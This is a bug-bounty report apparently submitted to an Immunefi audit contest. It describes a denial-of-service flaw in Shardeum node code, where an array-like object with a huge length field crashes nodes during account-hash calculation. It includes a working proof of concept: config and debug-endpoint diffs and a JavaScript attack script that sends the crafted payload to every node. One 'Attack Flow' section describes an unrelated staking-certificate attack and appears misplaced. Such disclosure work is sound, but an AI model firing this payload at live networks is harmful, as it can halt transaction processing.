# #40000 \[BC-Critical] Improper input validation in fixDeserializedWrappedEVMAccount leads to DOS and total network shutdown

**Submitted on Feb 12th 2025 at 13:48:37 UTC by @Blockian for** [**Audit Comp | Shardeum: Core III**](https://immunefi.com/audit-competition/audit-comp-shardeum-core-iii)

* **Report ID:** #40000
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/shardeum/shardeum/tree/bugbounty>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

## Description

## Note

This is the same bug that was already submitted in past contests, but was incorrectly fixed:[34484](https://reports.immunefi.com/shardeum-core/34484-bc-critical-tricking-legit-node-to-signed-maliciously-contr...) and [33941](https://reports.immunefi.com/shardeum-core/33941-bc-critical-a-missing-check-for-the-type-of-a-variable-allo...)\
As stated by you, all past reports expect those stated explicitly are in-scope.

## Impact

Can be used to crash nodes.

## Root Cause

The `fixDeserializedWrappedEVMAccount` [function](https://github.com/shardeum/shardeum//blob/bugbounty/src\debug\utils\wrappedEVMAccountFunctions.ts#L11-L11), which is commonly used throughout `shardeum` repositorie, does not perform validation on the passed data. It is possible to pass an "Array-like" object as the `storageRoot`,`codeHash`,`codeByte`,`value`, fields, which is accepted by `Uint8Array.from` used by the [`fixWrappedEVMAccountBuffers`](https://github.com/shardeum/shardeum//blob/bugbounty/src\debug\utils\wrappedEVMAccountFunctions.ts#L24-L24)/ [`fixAccountFields`](https://github.com/shardeum/shardeum//blob/bugbounty/src\debug\state\transactionState.ts#L125-L125) functions called from `fixDeserializedWrappedEVMAccount`.

## Attack Flow

* A malicious user legitimately calls the `binary/repair_oos_accounts` handler, but with a malicious account data.
* The account data is not validated before being passed to `fixDeserializedWrappedEVMAccount`, and causes the node to crash

## Deep Dive

### Trigger flow

* `binary_repair_oos_accounts` [handler](https://github.com/shardeum/core/blob/bugbounty/src\state-manager\AccountPatcher.ts#L496-L496) accepts a payload
* It then iterates its `repairInstructions` and extracts data from each instruction

```js
const { accountID, txId, hash, accountData, targetNodeId, signedReceipt }
```

* It then [validates](https://github.com/shardeum/core/blob/bugbounty/src\state-manager\AccountPatcher.ts#L515-L515) `targetNodeId`
* It then [validates](https://github.com/shardeum/core/blob/bugbounty/src\state-manager\AccountPatcher.ts#L524-L524) `accountId`
* It then [validates](https://github.com/shardeum/core/blob/bugbounty/src\state-manager\AccountPatcher.ts#L542-L542) `accountData.timestamp`
* It then [validates](https://github.com/shardeum/core/blob/bugbounty/src\state-manager\AccountPatcher.ts#L550-L550) `txId`
* It then [validates](https://github.com/shardeum/core/blob/bugbounty/src\state-manager\AccountPatcher.ts#L564-L564) `signedReceipt` with many validations
* It then [validates](https://github.com/shardeum/core/blob/bugbounty/src\state-manager\AccountPatcher.ts#L667-L667) `accountData.data`
  * But not before [calling](https://github.com/shardeum/core/blob/bugbounty/src\state-manager\AccountPatcher.ts#L665-L665) [`calculateAccountHash`](https://github.com/shardeum/shardeum//blob/bugbounty/src\index.ts#L6432-L6432)

### Crash flow

* [`calculateAccountHash`](https://github.com/shardeum/shardeum//blob/bugbounty/src\index.ts#L6432-L6432) calls [`fixDeserializedWrappedEVMAccount`](https://github.com/shardeum/shardeum//blob/bugbounty/src\shardeum\wrappedEVMAccountFunctions.ts#L86-L86)
* `fixDeserializedWrappedEVMAccount` in the case of `AccountType.Account` calls [`fixAccountFields`](https://github.com/shardeum/shardeum//blob/bugbounty/src\state\transactionState.ts#L139-L139)
* `fixAccountFields` calls [`fixAccountUint8Arrays`](https://github.com/shardeum/shardeum//blob/bugbounty/src\state\transactionState.ts#L154-L154)
* `fixAccountUint8Arrays` calls `Uint8Array.from` which accepts object with `length` field

## Attack Flow

* A malicious user asks a node to sign a staking certificate, also containing fields related to "remove-by-app" or "set-global".
* The user then uses that certificate to remove a node or change the global account config, successfully passing signature validation.

## Suggested Fix

Before calling `Array.from` validate the type is not an object, everywhere in the code.

## Severity

* This is a total network shutdown which is critical.
* In addition, this is the same as the past reports which were critical.

## Proof of Concept

## Proof of Concept

The POC is a combination of the \[\[#Trigger flow]] from \[\[#Deep Dive]] to show `calculateAccountHash` can be reached by a malicious node, with a POC that shows `calculateAccountHash` can be used to crash.

1. Apply the following changes to `shardeum`:

```diff
diff --git a/src/config/index.ts b/src/config/index.ts
index 78a7c2c2..04d4e021 100644
--- a/src/config/index.ts
+++ b/src/config/index.ts
@@ -143,9 +143,9 @@ config = merge(config, {
     p2p: {
       cycleDuration: 60,
       minNodesToAllowTxs: 1, // to allow single node networks
-      baselineNodes: process.env.baselineNodes ? parseInt(process.env.baselineNodes) : 1280, // config used for baseline for entering recovery, restore, and safety. Should be equivalient to minNodes on network startup
-      minNodes: process.env.minNodes ? parseInt(process.env.minNodes) : 1280,
-      maxNodes: process.env.maxNodes ? parseInt(process.env.maxNodes) : 1280,
+      baselineNodes: process.env.baselineNodes ? parseInt(process.env.baselineNodes) : 10, // config used for baseline for entering recovery, restore, and safety. Should be equivalient to minNodes on network startup
+      minNodes: process.env.minNodes ? parseInt(process.env.minNodes) : 10,
+      maxNodes: process.env.maxNodes ? parseInt(process.env.maxNodes) : 10,
       maxJoinedPerCycle: 10,
       maxSyncingPerCycle: 10,
       maxRotatedPerCycle: process.env.maxRotatedPerCycle ? parseInt(process.env.maxRotatedPerCycle) : 1,
@@ -157,7 +157,7 @@ config = merge(config, {
       amountToShrink: 5,
       maxDesiredMultiplier: 1.2,
       maxScaleReqs: 250, // todo: this will become a variable config but this should work for a 500 node demo
-      forceBogonFilteringOn: true,
+      forceBogonFilteringOn: false,
       //these are new feature in 1.3.0, we can make them default:true in shardus-core later
 
       // 1.2.3 migration starts
@@ -218,13 +218,13 @@ config = merge(config, {
       allowActivePerCycle: 1,
 
       syncFloorEnabled: true,  //ITN initially false for rotation safety
-      syncingDesiredMinCount: 40, //ITN = 40
+      syncingDesiredMinCount: 5, //ITN = 40
 
       activeRecoveryEnabled: true,//ITN initially false for rotation safety
       allowActivePerCycleRecover: 4, 
 
       flexibleRotationEnabled: true, //ITN 1.16.1
-      flexibleRotationDelta: 10,
+      flexibleRotationDelta: 0,
 
       maxStandbyCount: 30000, //max allowed standby nodes count
       enableMaxStandbyCount: true,
@@ -295,7 +295,7 @@ config = merge(config, {
     sharding: {
       nodesPerConsensusGroup: process.env.nodesPerConsensusGroup
         ? parseInt(process.env.nodesPerConsensusGroup)
-        : 128, //128 is the final goal
+        : 10, //128 is the final goal
       nodesPerEdge: process.env.nodesPerEdge ? parseInt(process.env.nodesPerEdge) : 5,
       executeInOneShard: true,
     },
@@ -345,11 +345,11 @@ config = merge(
   config,
   {
     server: {
-      mode: 'release', // todo: must set this to "release" for public networks or get security on endpoints. use "debug"
+      mode: 'debug', // todo: must set this to "release" for public networks or get security on endpoints. use "debug"
       // for easier debugging
       debug: {
-        startInFatalsLogMode: true, // true setting good for big aws test with nodes joining under stress.
-        startInErrorLogMode: false,
+        startInFatalsLogMode: false, // true setting good for big aws test with nodes joining under stress.
+        startInErrorLogMode: true,
         verboseNestedCounters: false,
         robustQueryDebug: false,
         fakeNetworkDelay: 0,

```

2. Apply the following changes to `core`:

```diff
diff --git a/src/state-manager/AccountPatcher.ts b/src/state-manager/AccountPatcher.ts
index 12d07d36..f81b7db2 100644
--- a/src/state-manager/AccountPatcher.ts
+++ b/src/state-manager/AccountPatcher.ts
@@ -1358,6 +1358,14 @@ class AccountPatcher {
       getAccountDataByHashesBinaryHandler.handler
     )
 
+    Context.network.registerExternalPost(
+      'blockian_hashAccountData',
+      (req, res) => {
+        const calculatedAccountHash = this.app.calculateAccountHash(req.body.accountData.data)
+        res.send(calculatedAccountHash)
+      }
+    )
+
     Context.network.registerExternalGet(
       'debug-patcher-ignore-hash-updates',
       isDebugModeMiddleware,

```

3. Run a 10 nodes network (`shardus start 10`)
4. Run a `json-rpc-server`
5. Run the following attack script:

```js
import axios from "axios";

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms))

async function sendHashAccountData(randomNode) {
    const accountData = {
        "data":{
            "accountType":0,
            "account":{
                "storageRoot":{
                    "data":{
                        "length": 4294967294
                    }
                },
                "codeHash":{
                    "data":{
                        "length": 4294967294
                    }
                }
            }
        }
    }
    
    console.log("Firing attack simulation")
    const data = await axios.post(`http://${randomNode.ip}:${randomNode.port}/blockian_hashAccountData`, { accountData })

    if(data.success) throw new Error(data.reason)
}

async function getNodeList() {
    console.log("Grabbing Nodelist ....");
    let res = await axios.get('http://0.0.0.0:4000/nodelist')   
    const nodelist = res.data.nodeList
    return nodelist
}

async function waitTillFinish() {
    console.log("Waiting 60 sec for transaction to be finalized");
    await sleep(60000)
}

const main = async  () => {
    let nodelist = await getNodeList()
    console.log("Node list before attack")
    console.log(nodelist)
    
    for (const node of nodelist) {
        sendHashAccountData(node)
    }
    await waitTillFinish()
    
    console.log("Node list after attack")
    console.log(await getNodeList())
}

main();
```
